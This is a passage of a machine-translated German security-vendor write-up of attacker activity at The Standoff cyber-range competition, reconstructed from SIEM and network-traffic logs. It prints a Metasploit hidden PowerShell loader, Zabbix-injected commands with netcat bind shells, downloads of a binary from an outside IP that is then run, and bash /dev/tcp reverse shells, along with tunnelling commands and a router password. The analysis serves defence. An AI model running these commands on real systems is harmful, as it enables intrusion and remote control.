Windows-Protokollen wird dieser Zugriff als win2008r2-dc $ angezeigt. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  Erstellt im Auftrag des neuen Benutzers einige Dienste, auf denen ein bestimmtes Powershell-Skript ausgef√ºhrt wird: <br><br><pre> <code class="hljs powershell">%COMSPEC% /b /c start /b /min powershell.exe <span class="hljs-literal"><span class="hljs-literal">-nop</span></span> <span class="hljs-literal"><span class="hljs-literal">-w</span></span> <span class="hljs-keyword"><span class="hljs-keyword">hidden</span></span> <span class="hljs-literal"><span class="hljs-literal">-noni</span></span> <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([<span class="hljs-built_in"><span class="hljs-built_in">Int</span></span><span class="hljs-type"><span class="hljs-type">Ptr</span></span>]::Size <span class="hljs-operator"><span class="hljs-operator">-eq</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>){<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-variable"><span class="hljs-variable">$env:windir</span></span>+<span class="hljs-string"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};<span class="hljs-variable"><span class="hljs-variable">$s</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">New-Object</span></span> System.Diagnostics.ProcessStartInfo;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.FileName=<span class="hljs-variable"><span class="hljs-variable">$b</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.UseShellExecute=<span class="hljs-variable"><span class="hljs-variable">$false</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.RedirectStandardOutput=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.CreateNoWindow=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$p</span></span>=[<span class="hljs-type"><span class="hljs-type">System.Diagnostics.Process</span></span>]::Start(<span class="hljs-variable"><span class="hljs-variable">$s</span></span>);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  Dieses Skript wurde vom Metasploit-Framework generiert.  Der Zweck besteht darin, den Socket an Port 55443 zum Abh√∂ren zu √∂ffnen und die ‚ÄûNutzlast‚Äú auszuf√ºhren, die an diesen Port gelangt ist - vermutlich Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  Ein Versuch, eine Remote-Shell zu starten, war erfolgreich.  Danach haben die Angreifer den Angriff weiterentwickelt und der Benutzername erstellt ein weiteres Konto mit dem Namen "vitalik". Dieses Konto wird der Gruppe "Domain Admins" hinzugef√ºgt. Kurz nach seiner Erstellung wird ein interaktives Login angezeigt. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  W√§hrend vitalik den Dienst mit demselben Powershell-Skript wie der Benutzername erstellte, setzte der Benutzername die Kennw√∂rter des Dom√§nenkontos massiv zur√ºck und interessierte sich f√ºr den benachbarten Dom√§nen-Mail-Server Win2008R2-EXCH. <br><br>  Die fast gleichzeitige Aktivit√§t von Benutzernamen- und Vitalik-Benutzern auf dem Exchange-Dom√§nenserver (Scannen und Anmelden) l√§sst darauf schlie√üen, dass h√∂chstwahrscheinlich mehrere Teammitglieder gleichzeitig das SPUTNIK-Netzwerk untersucht haben. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  vitalik √ºberpr√ºft die Verf√ºgbarkeit des Mailservers und startet die Serververwaltungskonsole nach einer interaktiven Anmeldung. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  Da er nichts Wertvolles findet, schleppt er seine Instrumente und seine schwere Artillerie auf den Win2008R2-DC-Host - zahlreiche Powershell-Skripte und das BloodHound-Framework werden auf dem Dom√§nencontroller angezeigt, der ein beliebtes Tool zur Aufkl√§rung in Active Directory-Netzwerken ist.  Um auf die BloodHound-Weboberfl√§che zugreifen zu k√∂nnen, musste der Teilnehmer den gesch√ºtzten Modus im IE deaktivieren, der auch vom SIEM erkannt wurde. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  Die BloodHound-Aktivit√§t im Netzwerk wurde von PT NAD nicht bestanden.  Eine der Funktionen des Tools war das Scannen von Hosts im Netzwerk nach aktiven Verbindungen.  Dieser Datenverkehr zum SRVSVC-Dienst wird von einer der PT NAD-Signaturen erkannt und zeigt Informationen innerhalb des Netzwerks an: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  Gegen ein Uhr morgens zogen die Angreifer, die zuvor mit dem Dienstprogramm vssadmin eine Schattenkopie der Festplatte erstellt hatten, die Datenbank ntds.dit mit allen Dom√§nenkonten.  Nachdem dieser Angriff erfolgreich abgeschlossen wurde, √ºbernehmen die Angreifer die vollst√§ndige Kontrolle √ºber die Domain und erhalten den Hash des speziellen Kontos "krbtgt", das ihnen zur Verf√ºgung steht.  Mit diesem Konto k√∂nnen Sie das sogenannte Konto erstellen und verwenden.  Goldenes Ticket - Kerberos-Ticket f√ºr uneingeschr√§nkten Zugriff auf Ressourcen in der Dom√§ne, Zugriff auf Server im Namen vorhandener und sogar nicht vorhandener Benutzer sowie Aktionen in der Dom√§ne.  Die Verwendung von Golden Ticket ist mit Schutzausr√ºstung nur schwer zu erkennen, die Kompromittierung der Links krbtgt und ntds.dit ist jedoch viel einfacher zu erkennen. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  Das Team wechselt schrittweise von der Dom√§nenforschung zur Erforschung des von ihm er√∂ffneten Netzwerks automatisierter Prozessleitsysteme.  Nachdem Nmap-Scanner zu SPUTNIK-Mitarbeitern - YLAVRENTIEV.sputnik.phd und EPONOMAREV.sputnik.phd - gezogen wurden, wurden die Netzwerke 172.20.xx gescannt. Die Teilnehmer verwendeten <a href="">nmap_performance.reg</a> , um die TCP / IP-Parameter des Windows-Stacks zu √§ndern und das Scannen des Prozesssteuerungsnetzwerks zu beschleunigen. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  Die Verbindungen zu den Hosts im automatischen Prozessleitsystem des Netzwerks √ºber die Tunnel auf den SPUTNIK-Dom√§nenhosts sprechen f√ºr sich.  Eine Beschreibung dessen, was die Hacker im industriellen Netzwerk getan haben, finden Sie im Video unserer Kollegen auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">YouTube</a> . <br><br>  Unter den anderen Errungenschaften der Angreifer wurden andere Tunnel, SSH-Sitzungen, kreative Durchbr√ºche nach einer schlaflosen Nacht am ersten Tag des Wettbewerbs und nat√ºrlich etablierte Bergleute, die die DDOS-M√ºnzw√§hrung abgebaut hatten, bemerkt. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  Das Hotel befindet sich im DMZ-B√ºro Nr. 1 und hat seine Rolle stolz bis gegen Mittag wahrgenommen. Es wurde von einem nicht identifizierten Team gehackt. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  Es war nicht schwierig, Administratoranmeldeinformationen zu finden, und das Team nutzte die integrierte zabbix-Funktionalit√§t, um die √úberwachungsfunktionen mithilfe benutzerdefinierter Skripts unbegrenzt zu erweitern. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  Sie k√∂nnen beliebige Linux-Befehle in den Skripten verwenden, mit denen die Mitgliederteams Shells und Socks-Proxys erstellt haben. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  Das Team hat versucht, das Modul vom Server unter Kontrolle 195.16.61.232 herunterzuladen, aber ohne Erfolg: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Nach einer kurzen Untersuchung der Umgebung installierte ich eine Remote-Bash-Shell mit Standard-Linux-Tools auf demselben Server und sendete Pakete direkt an / dev / tcp /. <br><br>  Nicht weniger interessant war der Inhalt des Verkehrs zwischen dem Team und den Granaten, der im Freien √ºbertragen wurde und nicht an PT NAD-Sensoren vorbeiging. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  Wie wir sehen k√∂nnen, wurde der ZABBIX-Server haupts√§chlich als Br√ºckenkopf f√ºr die Aufkl√§rung von Office-Subnetzen Nr. 1: 10.100.50.0/24 (Benutzer), 10.100.60.0/24 (Server) und 10.100.80.0/24 (SecurityTeam) verwendet. <br><br><h2>  Multiserver (100.64.100.167) </h2><br>  Multiserver ist ein weiterer Linux-Host in DMZ Office Nr. 1 mit zwei HTTP-Servern und einer integrierten MySQL-Datenbank.  Obwohl der Multiserver einem intensiven Scan unterzogen wurde, gab es nur wenige erfolgreiche Angriffe.  Der Host enthielt die SambaCry-Sicherheitsanf√§lligkeit 2017, die nach den Sicherheitsanf√§lligkeiten MS17-010 gefunden wurde, und die Teams versuchten, sie zu verwenden.  Mit dem PT NAD-Filter k√∂nnen Sie ihre Versuche auf der Zeitachse lokalisieren: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  Das Laden in einem der Versuche von Befehl # 3 war die ausf√ºhrbare Bibliothek DTECJtAf.so.  Nach dem Namen der Bibliothek zu urteilen, verwendeten die Teammitglieder das Modul is_known_pipename aus dem Metasploit Framework.  Beweis: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  W√§hrend der Konfrontation wurden Experten von PT MultiScanner unterst√ºtzt, der alle √ºber das Netzwerk fliegenden Dateien √ºberpr√ºfte, die von PT NAD bemerkt wurden.  Nach ein paar Augenblicken gibt er ein Urteil an DTECJtAf.so ab, das √ºber das Netzwerk fliegt: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  Dem Mangel an weiteren Netzwerkinteraktionen zwischen dem Server und Befehl Nr. 3 nach zu urteilen, brachte der Exploit keinen Erfolg.  Fast zur gleichen Zeit sehen wir jedoch eine aktive SSH-Sitzung von Team # 4.  Anhand des √ºbertragenen Datenverkehrs k√∂nnen wir beurteilen, dass die Angreifer den Server in vollem Umfang genutzt haben. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  Im Allgemeinen erfolgte die erste erfolgreiche SSH-Anmeldung des Administratorbenutzers aus Team Nr. 4 gegen 15.20 Uhr am 1. Tag des Wettbewerbs: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Wie bei jedem anst√§ndigen Angreifer folgt auf die Anmeldung die √úberpr√ºfung der Berechtigungen und die Aufkl√§rung des Hosts: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  Und dar√ºber hinaus: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  Mit Leichtigkeit f√ºhren wir die Zuordnung des Angreifers nach Sprache durch: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  Der Multiserver hat keine ordnungsgem√§√üe Konfiguration erhalten und es ist nicht sicher, welche anderen Versuche die Teams unternommen haben.  Gemessen an den verf√ºgbaren Protokollen dienten dieser Host sowie andere Hosts im DMZ-B√ºro Nr. 1 als Ausgangspunkt f√ºr die Erkundung der internen Infrastruktur des B√ºros. <br><br><h2>  Mis </h2><br>  Andere Gastgeber sind ebenfalls in den Fokus der Teams ger√ºckt.  Zum Beispiel verhielten sich die Teilnehmer in Bezug auf den Mikrotik-Router unter 100.64.100.237 im DMZ-Netzwerk von Office # 1 neugierig.  Am zweiten Tag der Konfrontation gegen 2 Uhr morgens erfolgte eine erfolgreiche Anmeldung an der Konsolenkonsole des Telnet-Routers mit dem Paar ‚Äûadmin: VxPvRxX74e8xrbia77hsi7WKm‚Äú.  Die Firmware-Version des Ger√§ts war 6.38.4 - dies ist die Version, auf der der ber√ºhmte Chimay Red Stack Clash-Exploit f√ºr Mikrotik getestet wurde, mit dem beliebiger Code auf dem Ger√§t ausgef√ºhrt und insbesondere Benutzerkennw√∂rter auf dem Router extrahiert werden konnten.  PT NAD hat eine Sicherheitsl√ºcke in Bezug auf die Ausnutzung entdeckt. <br><br>  Aber dann entschied sich das Team, das zuerst den Router nahm, im Mittagsbereich, die L√ºcke mit einem einfachen Firmware-Update zu schlie√üen und den Zugriff zu monopolisieren: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  Dies ist eines der wenigen Beispiele, bei denen ein Team von Teilnehmern eine L√ºcke im System schlie√üt, damit andere Teams diesen Host nicht erfassen k√∂nnen. <br><br>  PT MultiScanner hat ein merkw√ºrdiges Ereignis festgestellt: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  Um auf die Bank zuzugreifen, k√∂nnen Teams den auf der Website verf√ºgbaren Bankclient verwenden.  Die Site befindet sich im Bankennetz unter der Aufsicht eines Teams von Verteidigern, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">die den</a> Client mithilfe des Metasploit-Frameworks erstellt und durch das urspr√ºngliche ersetzt haben.  Zum Gl√ºck f√ºr die Verteidiger wurde der integrierte Client von mehreren Teams heruntergeladen, wie wir im obigen Screenshot von PT MultiScanner sehen k√∂nnen.  Erfolgreiche Verbindungen wurden nicht bemerkt, aber der Fall ist erw√§hnenswert, da solche Szenarien im normalen Leben auftreten - Angreifer-Trojaner-Programme auf offiziellen Websites oder Ersetzen von Updates, um Angriffe auf Clients auszuf√ºhren. <br><br><h2>  Bergleute </h2><br>  Eine weitere Innovation in The Standoff war das Aufkommen von Gaming Miner.  Der Legende nach k√∂nnten Teams die erbeuteten Server als Bergleute einsetzen, was ihnen zus√§tzliche Punkte einbrachte.  Anstelle herk√∂mmlicher Kryptow√§hrungen haben sie DDoS-M√ºnzen abgebaut - das W√§hrungs√§quivalent des Aufwands, der f√ºr einen DDoS-Angriff auf einen Server aufgewendet wurde.  Die Daten aus den TLS 1.2-Handshakes dienten als Proof-of-Work. Je mehr der Miner TLS-Handshakes mit dem Zielserver ausf√ºhrte, desto h√∂her war seine Wahrscheinlichkeit, einen neuen Block zu finden und seine Belohnung vom Organisator des DDoS-Angriffs zu erhalten. <br><br>  Der Client wurde in Go geschrieben und konnte sowohl unter Windows als auch unter Linux arbeiten.  Die Idee wurde zum ersten Mal angewendet, und obwohl es nicht allen Teams gelang, sie anzuwenden, wurden auf vielen Servern der Gaming-Infrastruktur Versuche unternommen, sie zu starten: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Versuchen Sie, den Miner auf dem Joomla-Knoten auszuf√ºhren (100.64.154.147). <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Ausf√ºhren des Miners √ºber die SPUTNIK-Infrastruktur (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  Als Teil des Spiels konnten Teams Kryptow√§hrung abbauen und gegen Spielpunkte eintauschen.  Die H√§lfte der Teams konnte die zuvor erfassten Server zum Extrahieren von Bl√∂cken verwenden.  Es gab auch eine Wechselkurskomponente in der Spiellogik - mit einer starken √Ñnderung der Menge der abgebauten W√§hrung verringerte sich der Wechselkurs.  So war es m√∂glich, spekulative Operationen durchzuf√ºhren und Punkte zu sammeln, ohne grundlegende Aufgaben zu erledigen.  Da diese Idee bisher in solchen Spielen nicht angewendet wurde, konnten die Teams sie nicht richtig anwenden, was den Spielverlauf nicht wesentlich beeinflusste. <br><br>  In Bezug auf die Anzahl der abgebauten Bl√∂cke √ºbernahm das kasachische CARKA-Team die F√ºhrung, die als erste Bergleute in der Spielinfrastruktur startete.  Hier konnten wir von den Netzwerknummern der Teams zu ihren Namen √ºbergehen, da ihre Kennungen Informationen √ºber den Block enthielten und bei der Berechnung ber√ºcksichtigt wurden.  Im Allgemeinen erwies sich die Idee als gut, und sie ist sicher beim n√§chsten The Standoff zu sehen. <br><br><h2>  Anstelle von Ausgabe </h2><br>  Last Standoff war hei√ü - 12 Teams haben die Infrastruktur der Stadt aktiv erkundet und gehackt.  Mit unseren Produkten konnten wir genau ‚Äûausspionieren‚Äú, wie die Spielteilnehmer handelten, welche Taktiken und Werkzeuge sie w√§hlten und was ihr Ziel wurde.  Wir haben gesehen, wie sie mit der Dom√§neninfrastruktur des B√ºros interagierten, angefangen mit der Infektion eines Computers bis hin zur Beschlagnahme der gesamten Dom√§ne und dem √úbergang zum n√§chsten ACS-Netzwerk.  W√§hrend einer Veranstaltung wie The Standoff haben die Produkte eine enorme Last: MaxPatrol SIEM hat 20.000 EPS bew√§ltigt, und PT NAD hat an beiden Tagen mehr als 3 Terabyte Netzwerkverkehr verarbeitet, ganz zu schweigen von der Netzwerkinfrastruktur selbst: Router, Switches und Firewalls. <br><br>  Ein solcher Kompromiss zwischen virtuellen B√ºros k√∂nnte mit realen ohne die geeigneten Schutz- und Kontrollmittel geschehen.  Dies f√ºhrt in der Regel zum Verlust wertvoller Daten wie Korrespondenz, Finanzdaten und personenbezogener Daten von Mitarbeitern / Nutzern. <br><br>  Unter den endlosen Scans, Brutes und Versuchen, alle Arten von Sicherheitsl√ºcken auszunutzen, halfen die Produkte dabei, festzustellen, wie die Server der Spielinfrastruktur gehackt wurden.  Erfolgreiche Angriffe und Spuren erfolgreicher Kompromisse wie Web-Shells, Remote-Konsolen, Tunnel und Host-Anmeldungen wurden ermittelt.  All dies hilft Experten, Produkte besser zu machen. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  In diesem Screenshot mit Statistiken zu VPN-Verbindungen von Teams w√§hrend des Spiels k√∂nnen Sie sehen, wie international The Standoff war: VPN-Verbindungen wurden mit Servern in den USA, Kasachstan, den Niederlanden und der H√§lfte Europas hergestellt!  √úbrigens gab es bei The Standoff keine Teams aus den USA oder Europa, aber es gab ein Team aus Kasachstan. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de418335/">https://habr.com/ru/post/de418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de418323/index.html">Ein wenig √ºber die Attribute der Hosts, Tastatur, Code und SCS in der Serie "World of the Wild West" (Westworld)</a></li>
<li><a href="../de418327/index.html">Schuhmacher mit Stiefeln: Welche Smartphones w√§hlen Experten f√ºr sich</a></li>
<li><a href="../de418329/index.html">Organisation sicherer Tests in der Produktion. Teil 2</a></li>
<li><a href="../de418331/index.html">Meister der Server und Netzwerke - sch√∂ne Ferien</a></li>
<li><a href="../de418333/index.html">Uber-Roboter kehren auf die Stra√üe zur√ºck, aber die Leute werden sie fahren</a></li>
<li><a href="../de418337/index.html">Hei√ü, Summer DataGrip 2018.2</a></li>
<li><a href="../de418339/index.html">"Manueller" Manipulator</a></li>
<li><a href="../de418341/index.html">Gl√ºcklicher Systemadministratortag! Gru√ükarte mit Bedeutung</a></li>
<li><a href="../de418345/index.html">Dokumentation von Informationsaustauschformaten - einfach und unkompliziert</a></li>
<li><a href="../de418347/index.html">Wie habe ich die Standard-C ++ 11-Bibliothek geschrieben oder warum ist Boost so be√§ngstigend? Kapitel 4.3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>